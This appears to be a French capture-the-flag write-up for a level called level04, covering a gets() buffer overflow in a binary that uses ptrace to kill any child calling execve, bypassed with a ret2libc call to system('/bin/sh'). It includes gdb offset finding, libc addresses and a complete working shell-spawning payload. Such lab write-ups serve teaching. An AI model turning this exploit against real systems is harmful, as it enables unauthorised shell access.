# level04 : buffer overflow + ret2libc (bypass ptrace)

```c
int main(int argc, char **argv, char **envp)
{
    char  buf[128];
    int   stat_loc = 0;
    pid_t pid = fork();

    memset(buf, 0, 128);

    if (pid) {
        while (1) {
            wait(&stat_loc);

            if (!(stat_loc & 127) || ((stat_loc & 127) + 1) >> 1 > 0) {
                puts("child is exiting...");
                break;
            }

            if (ptrace(PTRACE_PEEKUSER, pid, 44, 0) != 11)
                continue;

            puts("no exec() for you");
            kill(pid, 9);
            break;
        }
    }
    else {
        prctl(1, 1);
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        puts("Give me some shellcode, k");
        gets(buf);
    }

    return 0;
}
```

le parent surveille le child par ptrace : il lit le syscall en cours (offset 44 = ORIG_EAX) et si c'est execve (11) il tue le child. donc un shellcode execve est bloque -> on fait un ret2libc `system("/bin/sh")`. `gets(buf)` sans borne -> overflow.

offset avec pattern De Bruijn (follow-fork-mode child pour suivre le child) :

    (gdb) set follow-fork-mode child
    (gdb) run
    aaaabaaacaaad...
    Program received signal SIGSEGV, Segmentation fault.
    0x6261616f in ?? ()
    oaab = offset 156

adresses dans la libc (system + chaine "/bin/sh") :

    (gdb) print system
    $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
    (gdb) find &system, +9999999, "/bin/sh"
    0xf7f897ec

payload = padding + &system (call fonction system) + adresse de retour bidon (pour faire semblant que c'est un vrai call de fonction) + &"/bin/sh" (qui sera arg de la fonction system) :

    (
    printf 'A%.0s' {1..156}
    printf '\xd0\xae\xe6\xf7'
    printf 'RETS'
    printf '\xec\x97\xf8\xf7'
    cat
    ) | ./level04

codes ptrace/syscall utiles :

    PTRACE_TRACEME  = 0    le child demande a etre trace par son parent
    PTRACE_PEEKUSER = 3    le parent lit un registre du child
    offset 44             emplacement de ORIG_EAX = numero du syscall en cours
    syscall 11            execve (x86 32 bits)
    prctl(1, 1)           PR_SET_PDEATHSIG, SIGHUP : le child meurt si le parent meurt
